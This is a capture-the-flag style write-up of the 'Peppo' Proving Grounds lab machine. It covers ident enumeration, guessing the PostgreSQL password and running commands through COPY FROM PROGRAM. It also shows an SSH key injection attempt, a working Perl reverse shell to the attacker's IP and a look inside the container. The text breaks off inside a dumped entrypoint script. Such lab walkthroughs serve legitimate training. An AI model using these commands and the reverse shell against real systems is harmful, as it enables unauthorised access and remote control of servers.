
# Peppo
1. nmap and Identd enumeration
2. Guess user password and SSH into the box
3. Escape rbash using `ed`, and add appropriate directories to the PATHs
4. The user is part of the docker group, use docker to privesc

Rabbit Holes:
1. PostgreSQL RCE

# Enumeration

## nmap

```
# Nmap 7.91 scan initiated Sun Jan 23 03:28:41 2022 as: nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- -oN "/media/sf_Stuff1/Github/Solutions/Cyber Security/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Peppo/results/192.168.171.60/scans/_full_tcp_nmap.txt" -oX "/media/sf_Stuff1/Github/Solutions/Cyber Security/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Peppo/results/192.168.171.60/scans/xml/_full_tcp_nmap.xml" 192.168.171.60
Nmap scan report for 192.168.171.60
Host is up, received user-set (0.25s latency).
Scanned at 2022-01-23 03:28:42 EST for 538s
Not shown: 65529 filtered ports
Reason: 65529 no-responses
PORT      STATE  SERVICE           REASON         VERSION
22/tcp    open   ssh               syn-ack ttl 63 OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
|_auth-owners: root
| ssh-hostkey: 
|   2048 75:4c:02:01:fa:1e:9f:cc:e4:7b:52:fe:ba:36:85:a9 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCzklV3kD0MUV8hlgkTzmIXus0hs0kpUtsw944TP1RKcoGH+RVDKO3+X9tM0O5o4FWlq63/Rgu/MsM+MHhYJzR9SqhCwFN7FtcAumLaykQRuOTOUMWtRqNybqwTC1noDrh1I6zg/hmzNIOHBH7jVFX4hZ18puzP7kUEwLyzTL6gl8OekAnPGYQFNkLDLo1QuSHoPif+835rjirf6Z+AcVHtz+BCrJa+UvtCuDgQk6+hRvASZ/sZk21jTLqe+pc32a1yYnfySXJrfGevezVVeOzWca4Kbt8HcWz7nNmyS8vcr9U/sDD2ZvW0GEVgxneCDSha5zzAt3blNf8xgwaboetx
|   256 b7:6f:9c:2b:bf:fb:04:62:f4:18:c9:38:f4:3d:6b:2b (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBqNWmLnEEMpbdgBBhkcQQqjHi1mO1wl55JIWh4kpqzQYuZaKGZ63cIOppztFxsAowPqOEhImpkEni9fcTflquQ=
|   256 98:7f:b6:40:ce:bb:b5:57:d5:d1:3c:65:72:74:87:c3 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOEgaTq2swxYKGv8XDDrdarrUGFDnxl/3X18UjliCfL6
53/tcp    closed domain            reset ttl 63
113/tcp   open   ident             syn-ack ttl 63 FreeBSD identd
|_auth-owners: nobody
5432/tcp  open   postgresql        syn-ack ttl 62 PostgreSQL DB 9.6.0 or later
| fingerprint-strings: 
|   Kerberos: 
|     SFATAL
|     VFATAL
|     C0A000
|     Munsupported frontend protocol 27265.28208: server supports 2.0 to 3.0
|     Fpostmaster.c
|     L2071
|     RProcessStartupPacket
|   SMBProgNeg: 
|     SFATAL
|     VFATAL
|     C0A000
|     Munsupported frontend protocol 65363.19778: server supports 2.0 to 3.0
|     Fpostmaster.c
|     L2071
|     RProcessStartupPacket
|   ZendJavaBridge: 
|_    EFATAL: unsupported frontend protocol 0.0: server supports 2.0 to 3.0
8080/tcp  open   http              syn-ack ttl 62 WEBrick httpd 1.4.2 (Ruby 2.6.6 (2020-03-31))
|_http-favicon: Unknown favicon MD5: D316E1622C58825727E7E4E6C954D289
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 4 disallowed entries 
|_/issues/gantt /issues/calendar /activity /search
|_http-server-header: WEBrick/1.4.2 (Ruby/2.6.6/2020-03-31)
|_http-title: Redmine
10000/tcp open   snet-sensor-mgmt? syn-ack ttl 63
|_auth-owners: eleanor
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Hello, Help, Kerberos, LDAPBindReq, LDAPSearchReq, LPDString, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, SSLv23SessionReq, TLSSessionReq, TerminalServerCookie, X11Probe: 
|     HTTP/1.1 400 Bad Request
|     Connection: close
|   FourOhFourRequest: 
|     HTTP/1.1 200 OK
|     Content-Type: text/plain
|     Date: Sun, 23 Jan 2022 08:35:48 GMT
|     Connection: close
|     Hello World
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Content-Type: text/plain
|     Date: Sun, 23 Jan 2022 08:35:35 GMT
|     Connection: close
|     Hello World
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Content-Type: text/plain
|     Date: Sun, 23 Jan 2022 08:35:36 GMT
|     Connection: close
|_    Hello World
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port5432-TCP:V=7.91%I=9%D=1/23%Time=61ED1358%P=x86_64-pc-linux-gnu%r(SM
SF:BProgNeg,8C,"E\0\0\0\x8bSFATAL\0VFATAL\0C0A000\0Munsupported\x20fronten
SF:d\x20protocol\x2065363\.19778:\x20server\x20supports\x202\.0\x20to\x203
SF:\.0\0Fpostmaster\.c\0L2071\0RProcessStartupPacket\0\0")%r(Kerberos,8C,"
SF:E\0\0\0\x8bSFATAL\0VFATAL\0C0A000\0Munsupported\x20frontend\x20protocol
SF:\x2027265\.28208:\x20server\x20supports\x202\.0\x20to\x203\.0\0Fpostmas
SF:ter\.c\0L2071\0RProcessStartupPacket\0\0")%r(ZendJavaBridge,48,"EFATAL:
SF:\x20\x20unsupported\x20frontend\x20protocol\x200\.0:\x20server\x20suppo
SF:rts\x202\.0\x20to\x203\.0\n\0");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port10000-TCP:V=7.91%I=9%D=1/23%Time=61ED1357%P=x86_64-pc-linux-gnu%r(G
SF:etRequest,71,"HTTP/1\.1\x20200\x20OK\r\nContent-Type:\x20text/plain\r\n
SF:Date:\x20Sun,\x2023\x20Jan\x202022\x2008:35:35\x20GMT\r\nConnection:\x2
SF:0close\r\n\r\nHello\x20World\n")%r(HTTPOptions,71,"HTTP/1\.1\x20200\x20
SF:OK\r\nContent-Type:\x20text/plain\r\nDate:\x20Sun,\x2023\x20Jan\x202022
SF:\x2008:35:36\x20GMT\r\nConnection:\x20close\r\n\r\nHello\x20World\n")%r
SF:(RTSPRequest,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20c
SF:lose\r\n\r\n")%r(RPCCheck,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nCon
SF:nection:\x20close\r\n\r\n")%r(DNSVersionBindReqTCP,2F,"HTTP/1\.1\x20400
SF:\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")%r(DNSStatusRequest
SF:TCP,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\
SF:r\n")%r(Hello,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20
SF:close\r\n\r\n")%r(Help,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnec
SF:tion:\x20close\r\n\r\n")%r(SSLSessionReq,2F,"HTTP/1\.1\x20400\x20Bad\x2
SF:0Request\r\nConnection:\x20close\r\n\r\n")%r(TerminalServerCookie,2F,"H
SF:TTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")%r(T
SF:LSSessionReq,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20c
SF:lose\r\n\r\n")%r(SSLv23SessionReq,2F,"HTTP/1\.1\x20400\x20Bad\x20Reques
SF:t\r\nConnection:\x20close\r\n\r\n")%r(Kerberos,2F,"HTTP/1\.1\x20400\x20
SF:Bad\x20Request\r\nConnection:\x20close\r\n\r\n")%r(SMBProgNeg,2F,"HTTP/
SF:1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")%r(X11Pr
SF:obe,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\
SF:r\n")%r(FourOhFourRequest,71,"HTTP/1\.1\x20200\x20OK\r\nContent-Type:\x
SF:20text/plain\r\nDate:\x20Sun,\x2023\x20Jan\x202022\x2008:35:48\x20GMT\r
SF:\nConnection:\x20close\r\n\r\nHello\x20World\n")%r(LPDString,2F,"HTTP/1
SF:\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")%r(LDAPSe
SF:archReq,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\
SF:r\n\r\n")%r(LDAPBindReq,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConne
SF:ction:\x20close\r\n\r\n")%r(SIPOptions,2F,"HTTP/1\.1\x20400\x20Bad\x20R
SF:equest\r\nConnection:\x20close\r\n\r\n");
OS fingerprint not ideal because: Didn't receive UDP response. Please try again with -sSU
Aggressive OS guesses: Linux 3.11 - 4.1 (93%), Linux 3.16 (92%), Linux 4.4 (92%), Linux 3.13 (89%), Linux 3.2 - 3.8 (88%), Linux 3.8 (88%), WatchGuard Fireware 11.8 (88%), Linux 3.10 - 3.16 (87%), Linux 3.10 - 3.12 (87%), Linux 2.6.32 (87%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.91%E=4%D=1/23%OT=22%CT=53%CU=%PV=Y%DS=2%DC=T%G=N%TM=61ED13D4%P=x86_64-pc-linux-gnu)
SEQ(SP=105%GCD=1%ISR=104%TI=Z%II=I%TS=8)
OPS(O1=M506ST11NW7%O2=M506ST11NW7%O3=M506NNT11NW7%O4=M506ST11NW7%O5=M506ST11NW7%O6=M506ST11)
WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)
ECN(R=Y%DF=Y%TG=40%W=7210%O=M506NNSNW7%CC=Y%Q=)
T1(R=Y%DF=Y%TG=40%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=N)
T5(R=Y%DF=Y%TG=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
T6(R=N)
T7(R=N)
U1(R=N)
IE(R=Y%DFI=N%TG=40%CD=S)

Uptime guess: 0.006 days (since Sun Jan 23 03:29:36 2022)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=261 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OSs: Linux, FreeBSD; CPE: cpe:/o:linux:linux_kernel, cpe:/o:freebsd:freebsd

TRACEROUTE (using port 53/tcp)
HOP RTT       ADDRESS
1   256.60 ms 192.168.49.1
2   256.71 ms 192.168.171.60

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Jan 23 03:37:40 2022 -- 1 IP address (1 host up) scanned in 538.60 seconds

```

## 113 - Identd

https://book.hacktricks.xyz/pentesting/113-pentesting-ident

```
┌──(kali㉿kali)-[/tmp]
└─$ ident-user-enum 192.168.1.100 22 113 139 4
Command 'ident-user-enum' not found, but can be installed with:
sudo apt install ident-user-enum
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ sudo apt install ident-user-enum  

...

┌──(kali㉿kali)-[/tmp]
└─$ ident-user-enum 192.168.171.60 22 113 8080 5432 10000
ident-user-enum v1.0 ( http://pentestmonkey.net/tools/ident-user-enum )

192.168.171.60:22       root
192.168.171.60:113      nobody
192.168.171.60:8080     <unknown>
192.168.171.60:5432     <unknown>
192.168.171.60:10000    eleanor
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ 

```

## 5432 - PostgreSQL

```
┌──(kali㉿kali)-[~]
└─$ psql -h 192.168.171.60 -p 5432 -U postgres
Password for user postgres: 
psql (13.2 (Debian 13.2-1), server 12.3 (Debian 12.3-1.pgdg100+1))
Type "help" for help.

postgres=# # Password is postgres (guessed)
postgres-# show databases;
ERROR:  syntax error at or near "#"
LINE 1: # Password is postgres (guessed)
        ^
postgres=# show databases;
ERROR:  unrecognized configuration parameter "databases"
postgres=# \list;
invalid command \list;
Try \? for help.
postgres=# \list
                                 List of databases
   Name    |  Owner   | Encoding |  Collate   |   Ctype    |   Access privileges   
-----------+----------+----------+------------+------------+-----------------------
 postgres  | postgres | UTF8     | en_US.utf8 | en_US.utf8 | 
 template0 | postgres | UTF8     | en_US.utf8 | en_US.utf8 | =c/postgres          +
           |          |          |            |            | postgres=CTc/postgres
 template1 | postgres | UTF8     | en_US.utf8 | en_US.utf8 | =c/postgres          +
           |          |          |            |            | postgres=CTc/postgres
(3 rows)

postgres=# \c postgres
psql (13.2 (Debian 13.2-1), server 12.3 (Debian 12.3-1.pgdg100+1))
You are now connected to database "postgres" as user "postgres".
postgres=# \d
Did not find any relations.
postgres=# \du+
                                          List of roles
 Role name |                         Attributes                         | Member of | Description 
-----------+------------------------------------------------------------+-----------+-------------
 postgres  | Superuser, Create role, Create DB, Replication, Bypass RLS | {}        | 

postgres=# \c template0
FATAL:  database "template0" is not currently accepting connections
Previous connection kept
postgres=# \c template1
psql (13.2 (Debian 13.2-1), server 12.3 (Debian 12.3-1.pgdg100+1))
You are now connected to database "template1" as user "postgres".
template1=# \d
Did not find any relations.
template1=# \du+
                                          List of roles
 Role name |                         Attributes                         | Member of | Description 
-----------+------------------------------------------------------------+-----------+-------------
 postgres  | Superuser, Create role, Create DB, Replication, Bypass RLS | {}        | 

template1=# CREATE TABLE demo(t text);
CREATE TABLE
template1=# COPY demo from '/etc/passwd';
COPY 20
template1=# SELECT * FROM demo;
                                         t                                         
-----------------------------------------------------------------------------------
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
 bin:x:2:2:bin:/bin:/usr/sbin/nologin
 sys:x:3:3:sys:/dev:/usr/sbin/nologin
 sync:x:4:65534:sync:/bin:/bin/sync
 games:x:5:60:games:/usr/games:/usr/sbin/nologin
 man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
 lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
 mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
 news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
 uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
 proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
 www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
 backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
 list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
 irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
 gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
 nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
 _apt:x:100:65534::/nonexistent:/usr/sbin/nologin
 postgres:x:999:999::/var/lib/postgresql:/bin/bash
(20 rows)

template1=#
```

## 8080 - Web - WEBrick httpd 1.4.2 
![](Pasted%20image%2020220123165022.png)

### Logging In

![](Pasted%20image%2020220123165112.png)

![](Pasted%20image%2020220123165134.png)

![](Pasted%20image%2020220123165308.png)


# Exploit Into Docker

## PostgreSQL RCE

```
template1=# drop table demo;
DROP TABLE
template1=# CREATE TABLE demo(t text);
CREATE TABLE
template1=# COPY demo from PROGRAM 'whoami';
COPY 1
template1=# SELECT * FROM demo;
    t     
----------
 postgres
(1 row)

template1=# drop table demo;
DROP TABLE
template1=# CREATE TABLE demo(t text);
CREATE TABLE
template1=# COPY demo from PROGRAM 'pwd';
COPY 1
template1=# SELECT * FROM demo;
            t             
--------------------------
 /var/lib/postgresql/data
(1 row)

template1=# 
```

## Try to inject ssh key

```
┌──(kali㉿kali)-[~]
└─$ cat ~/.ssh/id_rsa.pub
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDOsEissc9Y+fzA8gO2e21AUR7bL6/5bwR/NXrutNtFABTqohh2vrMFqeiY7ZKXg/xkdow2hF29mC6HUHXTv2c1oVfEH5l3fXgX67abSr2mliQnnFdxVPmONQhe3GUz818fXzM0UMyQhhiq/ZdJCEe/Y0pyv3akIzePTdV25AYUmbLr3hiDfVjJ56YEnuul3LkMq/O2nCXanGmUGoHWGeqMMPsHNvI4M7k02H/0kFdgm7cBJNkgA9Q2sHmOgPl4Pi2mymbhznkSz4uwU5HOPO/bXw4pMeQbTopRs+q+oZArCm9PYwpAzqnXkcmos8MQla4BZOxSY4TKhDvRedfh4x/4nXdHEwMJVf2w8A2ThuHTbp9DoOLft9FHdOv/q/DiN/HpiUg84tOOB42daaUY9jh2/aArPkG3KjZKR9XnIZfgmu56S5lS/MQCdLv8ApbtsGOFnoHZcfAwbtJ+6b4inPYuazgqr1Up6Rc7CQ+JIijQRO9dpSvHGLoEjaNnOsPW7hM= kali@kali
                                                                                                                                                                        
┌──(kali㉿kali)-[~]
└─$ cat ~/.ssh/id_rsa.pub | base64
c3NoLXJzYSBBQUFBQjNOemFDMXljMkVBQUFBREFRQUJBQUFCZ1FET3NFaXNzYzlZK2Z6QThnTzJl
MjFBVVI3Ykw2LzVid1IvTlhydXROdEZBQlRxb2hoMnZyTUZxZWlZN1pLWGcveGtkb3cyaEYyOW1D
NkhVSFhUdjJjMW9WZkVINWwzZlhnWDY3YWJTcjJtbGlRbm5GZHhWUG1PTlFoZTNHVXo4MThmWHpN
MFVNeVFoaGlxL1pkSkNFZS9ZMHB5djNha0l6ZVBUZFYyNUFZVW1iTHIzaGlEZlZqSjU2WUVudXVs
M0xrTXEvTzJuQ1hhbkdtVUdvSFdHZXFNTVBzSE52STRNN2swMkgvMGtGZGdtN2NCSk5rZ0E5UTJz
SG1PZ1BsNFBpMm15bWJoem5rU3o0dXdVNUhPUE8vYlh3NHBNZVFiVG9wUnMrcStvWkFyQ205UFl3
cEF6cW5Ya2Ntb3M4TVFsYTRCWk94U1k0VEtoRHZSZWRmaDR4LzRuWGRIRXdNSlZmMnc4QTJUaHVI
VGJwOURvT0xmdDlGSGRPdi9xL0RpTi9IcGlVZzg0dE9PQjQyZGFhVVk5amgyL2FBclBrRzNLalpL
UjlYbklaZmdtdTU2UzVsUy9NUUNkTHY4QXBidHNHT0Zub0haY2ZBd2J0Sis2YjRpblBZdWF6Z3Fy
MVVwNlJjN0NRK0pJaWpRUk85ZHBTdkhHTG9FamFObk9zUFc3aE09IGthbGlAa2FsaQo=
                                                                                                                                                                        
┌──(kali㉿kali)-[~]
└─$
```

```
template1=# drop table demo;
DROP TABLE
template1=# CREATE TABLE demo(t text);COPY demo from PROGRAM 'mkdir -p /var/lib/postgresql/.ssh';SELECT * FROM demo;
CREATE TABLE
COPY 0
 t 
---
(0 rows)

template1=# COPY (select convert_from(decode('c3NoLXJzYSBBQUFBQjNOemFDMXljMkVBQUFBREFRQUJBQUFCZ1FET3NFaXNzYzlZK2Z6QThnTzJlMjFBVVI3Ykw2LzVid1IvTlhydXROdEZBQlRxb2hoMnZyTUZxZWlZN1pLWGcveGtkb3cyaEYyOW1DNkhVSFhUdjJjMW9WZkVINWwzZlhnWDY3YWJTcjJtbGlRbm5GZHhWUG1PTlFoZTNHVXo4MThmWHpNMFVNeVFoaGlxL1pkSkNFZS9ZMHB5djNha0l6ZVBUZFYyNUFZVW1iTHIzaGlEZlZqSjU2WUVudXVsM0xrTXEvTzJuQ1hhbkdtVUdvSFdHZXFNTVBzSE52STRNN2swMkgvMGtGZGdtN2NCSk5rZ0E5UTJzSG1PZ1BsNFBpMm15bWJoem5rU3o0dXdVNUhPUE8vYlh3NHBNZVFiVG9wUnMrcStvWkFyQ205UFl3cEF6cW5Ya2Ntb3M4TVFsYTRCWk94U1k0VEtoRHZSZWRmaDR4LzRuWGRIRXdNSlZmMnc4QTJUaHVIVGJwOURvT0xmdDlGSGRPdi9xL0RpTi9IcGlVZzg0dE9PQjQyZGFhVVk5amgyL2FBclBrRzNLalpLUjlYbklaZmdtdTU2UzVsUy9NUUNkTHY4QXBidHNHT0Zub0haY2ZBd2J0Sis2YjRpblBZdWF6Z3FyMVVwNlJjN0NRK0pJaWpRUk85ZHBTdkhHTG9FamFObk9zUFc3aE09IGthbGlAa2FsaQ==','base64'),'utf-8')) to '/var/lib/postgresql/.ssh/authorized_keys';
COPY 1
template1=#
template1=# drop table demo; CREATE TABLE demo(t text);COPY demo from PROGRAM 'chmod 777 /var/lib/postgresql/.ssh/authorized_keys';SELECT * FROM demo;
DROP TABLE
CREATE TABLE
COPY 0
 t 
---
(0 rows)

template1=# 
```

```
┌──(kali㉿kali)-[~]
└─$ ssh -i ~/.ssh/id_rsa postgres@192.168.171.60                                                                                                                  130 ⨯
postgres@192.168.171.60's password: 
Permission denied, please try again.
postgres@192.168.171.60's password: 

                                                                                                                                                                        
┌──(kali㉿kali)-[~]
└─$ 
```

### Perl Reverse Shell

```
convert_from(decode('','base64'),'utf-8')
```

Doesn't work

```
template1=# drop table demo; CREATE TABLE demo(t text);COPY demo from PROGRAM 'perl -e ''use Socket;$i="192.168.49.171";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};''';SELECT * FROM demo;
DROP TABLE
CREATE TABLE
```

```
┌──(kali㉿kali)-[~]
└─$ sudo nc -nlvp 443             
listening on [any] 443 ...
connect to [192.168.49.171] from (UNKNOWN) [192.168.171.60] 60228
bash: cannot set terminal process group (244): Inappropriate ioctl for device
bash: no job control in this shell
postgres@326cfee15738:~/data$ 

```

Docker Container

```
postgres@326cfee15738:/$ cat /proc/self/cgroup
cat /proc/self/cgroup
10:pids:/docker/326cfee157384615c872763b1a690d34c59650bfc4a9007be1df15b81b6d7bfb
9:perf_event:/docker/326cfee157384615c872763b1a690d34c59650bfc4a9007be1df15b81b6d7bfb
8:devices:/docker/326cfee157384615c872763b1a690d34c59650bfc4a9007be1df15b81b6d7bfb
7:freezer:/docker/326cfee157384615c872763b1a690d34c59650bfc4a9007be1df15b81b6d7bfb
6:memory:/docker/326cfee157384615c872763b1a690d34c59650bfc4a9007be1df15b81b6d7bfb
5:blkio:/docker/326cfee157384615c872763b1a690d34c59650bfc4a9007be1df15b81b6d7bfb
4:net_cls,net_prio:/docker/326cfee157384615c872763b1a690d34c59650bfc4a9007be1df15b81b6d7bfb
3:cpuset:/docker/326cfee157384615c872763b1a690d34c59650bfc4a9007be1df15b81b6d7bfb
2:cpu,cpuacct:/docker/326cfee157384615c872763b1a690d34c59650bfc4a9007be1df15b81b6d7bfb
1:name=systemd:/docker/326cfee157384615c872763b1a690d34c59650bfc4a9007be1df15b81b6d7bfb
postgres@326cfee15738:/$ 
postgres@326cfee15738:/$ uname -a
uname -a
Linux 326cfee15738 4.9.0-12-amd64 #1 SMP Debian 4.9.210-1 (2020-01-20) x86_64 GNU/Linux
postgres@326cfee15738:/$ 

```

```
postgres@326cfee15738:/$ ls
ls
bin
boot
dev
docker-entrypoint-initdb.d
docker-entrypoint.sh
etc
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
postgres@326cfee15738:/$ cat docker-entrypoint.sh
cat docker-entrypoint.sh
#!/usr/bin/env bash
set -Eeo pipefail
# TODO swap to -Eeuo pipefail above (after handling all potentially-unset variables)

# usage: file_env VAR [DEFAULT]
#    ie: file_env 'XYZ_DB_PASSWORD' 'example'
# (will allow for "$XYZ_DB_PASSWORD_FILE" to fill in the value of
#  "$XYZ_DB_PASSWORD" from a file, especially for Docker's secrets feature)
file_env() {
        local var="$1"
        local fileVar="${var}_FILE"
        local def="${2:-}"
        if [ "${!var:-}" ] && [ "${!fileVar:-}" ]; then
                echo >&2 "error: both $var and $fileVar are set (but are exclusive)"
                exit 1
        fi
        local val="$def"
        if [ "${!var:-}" ]; then
                val="${!var}"
        elif [ "${!fileVar:-}" ]; then
                val="$(< "${!fileVar}")"
        fi
        export "$var"="$val"
        unset "$fileVar"
}

# check to see if this file is being run or sourced from another script
_is_sourced() {
        # https://unix.stackexchange.com/a/215279
        [ "${#FUNCNAME[@]}" -ge 2 ] \
                && [ "${FUNCNAME[0]}" = '_is_sourced' ] \
                && [ "${FUNCNAME[1]}" = 'source' ]
}

# used to create initial postgres directories and if run as root, ensure ownership to the "postgres" user
docker_create_db_directories() {
        local user; user="$(id -u)"

        mkdir -p "$PGDATA"
        chmod 700 "$PGDATA"

        # ignore failure since it will be fine when using the image provided directory; see also https://github.com/docker-library/postgres/pull/289
        mkdir -p /var/run/postgresql || :
        chmod 775 /var/run/postgresql || :

        # Create the transaction log directory before initdb is run so the directory is owned by the correct user
        if [ -n "$POSTGRES_INITDB_WALDIR" ]; then
                mkdir -p "$POSTGRES_INITDB_WALDIR"
                if [ "$user" = '0' ]; then
                        find "$POSTGRES_INITDB_WALDIR" \! -user postgres -exec chown postgres '{}' +
                fi
                chmod 700 "$POSTGRES_INITDB_WALDIR"
        fi

        # allow the container to be started with `--user`
        if [ "$user" = '0' ]; then
                find "$PGDATA" \! -user postgres -exec chown postgres '{}' +
                find /var/run/postgresql \! -user postgres -exec chown postgres '{}' +
        fi
}

# initialize empty PGDATA directory with new database via 'initdb'
# arguments to `initdb` can be passed via POSTGRES_INITDB_ARGS or as arguments to this function
# `initdb` automatically creates the "postgres", "template0", and "template1" dbnames
# this is also where the database user is created, specified by `POSTGRES_USER` env
docker_init_database_dir() {
        # "initdb" is particular about the current user existing in "/etc/passwd", so we use "nss_wrapper" to fake that if necessary
        # see https://github.com/docker-library/postgres/pull/253, https://github.com/docker-library/postgres/issues/359, https://cwrap.org/nss_wrapper.html
        if ! getent passwd "$(id -u)" &> /dev/null && [ -e /usr/lib/libnss_wrapper.so ]; then
                export LD_PRELOAD='/usr/lib/libnss_wrapper.so'
                export NSS_WRAPPER_PASSWD="$(mktemp)"
                export NSS_WRAPPER_GROUP="$(mktemp)"
                echo "postgres:x:$(id -u):$(id -g):PostgreSQL:$PGDATA:/bin/false" > "$NSS_WRAPPER_PASSWD"
                echo "postgres:x:$(id -g):" > "$NSS_WRAPPER_GROUP"
        fi

        if [ -n "$POSTGRES_INITDB_WALDIR" ]; then
                set -- --waldir "$POSTGRES_INITDB_WALDIR" "$@"
        fi

        eval 'initdb --username="$POSTGRES_USER" --pwfile=<(echo "$POSTGRES_PASSWORD") '"$POSTGRES_INITDB_ARGS"' "$@"'

        # unset/cleanup "nss_wrapper" bits
        if [ "${LD_PRELOAD:-}" = '/usr/lib/libnss_wrapper.so' ]; then
                rm -f "$NSS_WRAPPER_PASSWD" "$NSS_WRAPPER_GROUP"
                unset LD_PRELOAD NSS_WRAPPER_PASSWD NSS_WRAPPER_GROUP
        fi
}

# print large warning if POSTGRES_PASSWORD is long
# error if both POSTGRES_PASSWORD is empty and POSTGRES_HOST_AUTH_METHOD is not 'trust'
# print large warning if POSTGRES_HOST_AUTH_METHOD is set to 'trust'
# assumes database is not set up, ie: [ -z "$DATABASE_ALREADY_EXISTS" ]
docker_verify_minimum_env() {
        # check password first so we can output the warning before postgres
        # messes it up
        if [ "${#POSTGRES_PASSWORD}" -ge 100 ]; then
                cat >&2 <<-'EOWARN'

                        WARNING: The supplied POSTGRES_PASSWORD is 100+ characters.

                          This will not work if used via PGPASSWORD with "psql".

                          https://www.postgresql.org/message-id/flat/E1Rqxp2-0004Qt-PL%40wrigleys.postgresql.org (BUG #6412)
                          https://github.com/docker-library/postgres/issues/507

                EOWARN
        fi
        if [ -z "$POSTGRES_PASSWORD" ] && [ 'trust' != "$POSTGRES_HOST_AUTH_METHOD" ]; then
                # The - option suppresses leading tabs but *not* spaces. :)
                cat >&2 <<-'EOE'
                        Error: Database is uninitialized and superuser password is not specified.
                               You must specify POSTGRES_PASSWORD to a non-empty value for the
                               superuser. For example, "-e POSTGRES_PASSWORD=password" on "docker run".

                               You may also use "POSTGRES_HOST_AUTH_METHOD=trust" to allow all
                               connections without a password. This is *not* recommended.

                               See PostgreSQL documentation about "trust":
                               https://www.postgresql.org/docs/current/auth-trust.html
                EOE
                exit 1
        fi
        if [ 'trust' = "$POSTGRES_HOST_AUTH_METHOD" ]; then
                cat >&2 <<-'EOWARN'
                        ********************************************************************************
                        WARNING: POSTGRES_HOST_AUTH_METHOD has been set to "trust". This will allow
                                 anyone with access to the Postgres port to access your database without
                                 a password, even if POSTGRES_PASSWORD is set. See PostgreSQL
                                 documentation about "trust":
                                 https://www.postgresql.org/docs/current/auth-trust.html
                                 In Docker's default configuration, this is effectively any other
                                 container on the same system.

                                 It is not recommended to use POSTGRES_HOST_AUTH_METHOD=trust. Replace
                                 it with "-e POSTGRES_PASSWORD=password" instead to set a password in
                                 "docker run".
                        ********************************************************************************
                EOWARN
        fi
}

# usage: docker_process_init_files [file [file [...]]]
#    ie: docker_process_init_files /always-initdb.d/*
# process initializer files, based on file extensions and permissions
docker_process_init_files() {
        # psql here for backwards compatiblilty "${psql[@]}"
        psql=( docker_process_sql )

        echo
        local f
        for f; do
                case "$f" in
                        *.sh)
                                # https://github.com/docker-library/postgres/issues/450#issuecomment-393167936
                                # https://github.com/docker-library/postgres/pull/452
                                if [ -x "$f" ]; then
                                        echo "$0: running $f"
                                        "$f"
                                else
                                        echo "$0: sourcing $f"
                                        . "$f"
                                fi
                                ;;
                        *.sql)    echo "$0: running $f"; docker_process_sql -f "$f"; echo ;;
                        *.sql.gz) echo "$0: running $f"; gunzip -c "$f" | docker_process_sql; echo ;;
                        *.sql.xz) echo "$0: running $f"; xzcat "$f" | docker_process_sql; echo ;;
